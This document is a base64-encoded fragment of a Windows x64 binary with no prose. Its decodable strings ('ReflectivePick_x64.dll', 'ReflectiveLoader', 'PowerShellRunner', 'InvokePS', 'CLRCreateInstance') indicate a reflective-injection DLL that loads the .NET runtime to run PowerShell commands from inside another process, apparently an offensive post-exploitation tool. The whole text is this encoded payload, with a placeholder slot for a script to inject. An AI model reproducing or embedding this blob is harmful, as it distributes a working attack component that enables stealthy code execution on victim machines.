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AAAAAAAABDAEwAUgAgAGYAYQBpAGwAZQBkACAAdABvACAAcwB0AGEAcgB0ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAAAAAEkAQwBvAHIAUgB1AG4AdABpAG0AZQBIAG8AcwB0ADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AEQAbwBtAGEAaQBuACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAZABlAGYAYQB1AGwAdAAgAEEAcABwAEQAbwBtAGEAaQBuACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGwAbwBhAGQAIAB0AGgAZQAgAGEAcwBzAGUAbQBiAGwAeQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAAAAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAdABoAGUAIABUAHkAcABlACAAaQBuAHQAZQByAGYAYQBjAGUAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAG4AdgBvAGsAZQAtAFIAZQBwAGwAYQBjAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIA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AAAAAAAIAGAAAAAAAAgAIAAAAAAACAAAAAAAAAAACGjQEAAAAAAAAAAAAAAAAAT0xFQVVUMzIuZGxsAAAAAENMUkNyZWF0ZUluc3RhbmNlAG1zY29yZWUuZGxsAM4BR2V0Q29tbWFuZExpbmVBABQCR2V0Q3VycmVudFRocmVhZElkAABqA0lzRGVidWdnZXJQcmVzZW50AHADSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABWAkdldExhc3RFcnJvcgAAPANIZWFwRnJlZQAAOANIZWFwQWxsb2MAJQFFbmNvZGVQb2ludGVyAP8ARGVjb2RlUG9pbnRlcgC3BFJ0bFBjVG9GaWxlSGVhZGVyAEQEUmFpc2VFeGNlcHRpb24AACkBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKUDTGVhdmVDcml0aWNhbFNlY3Rpb24AALsEUnRsVW53aW5kRXgAGQVTZXRMYXN0RXJyb3IAAFcBRXhpdFByb2Nlc3MAbAJHZXRNb2R1bGVIYW5kbGVFeFcAAKQCR2V0UHJvY0FkZHJlc3MAANQDTXVsdGlCeXRlVG9XaWRlQ2hhcgDdBVdpZGVDaGFyVG9NdWx0aUJ5dGUAqQJHZXRQcm9jZXNzSGVhcAAAxwJHZXRTdGRIYW5kbGUAAEUCR2V0RmlsZVR5cGUABgFEZWxldGVDcml0aWNhbFNlY3Rpb24AxQJHZXRTdGFydHVwSW5mb1cAaAJHZXRNb2R1bGVGaWxlTmFtZUEAADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkAN0CR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUALgJHZXRFbnZpcm9ubWVudFN0cmluZ3NXAACjAUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAK4EUnRsQ2FwdHVyZUNvbnRleHQAtQRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAC8BFJ0bFZpcnR1YWxVbndpbmQAAJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBRA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAYQVTbGVlcAAPAkdldEN1cnJlbnRQcm9jZXNzAHAFVGVybWluYXRlUHJvY2VzcwAAggVUbHNBbGxvYwAAhAVUbHNHZXRWYWx1ZQCFBVRsc1NldFZhbHVlAIMFVGxzRnJlZQBtAkdldE1vZHVsZUhhbmRsZVcAAPEFV3JpdGVGaWxlAGkCR2V0TW9kdWxlRmlsZU5hbWVXAAB1A0lzVmFsaWRDb2RlUGFnZQCqAUdldEFDUAAAjQJHZXRPRU1DUAAAuQFHZXRDUEluZm8AqgNMb2FkTGlicmFyeUV4VwAAPwNIZWFwUmVBbGxvYwD9A091dHB1dERlYnVnU3RyaW5nVwAAmAFGbHVzaEZpbGVCdWZmZXJzAADiAUdldENvbnNvbGVDUAAA9AFHZXRDb25zb2xlTW9kZQAAzAJHZXRTdHJpbmdUeXBlVwAAQQNIZWFwU2l6ZQAAmQNMQ01hcFN0cmluZ1cAAH8AQ2xvc2VIYW5kbGUAMAVTZXRTdGRIYW5kbGUAAAwFU2V0RmlsZVBvaW50ZXJFeAAA8AVXcml0ZUNvbnNvbGVXAMIAQ3JlYXRlRmlsZVcAHgZsc3RybGVuQQAAtQNMb2NhbEZyZWUAS0VSTkVMMzIuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADKi3y2ZKwAAzV0g0mbU//8AAwKAAQAAAAAAAAAAAAAAAAMCgAEAAAABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA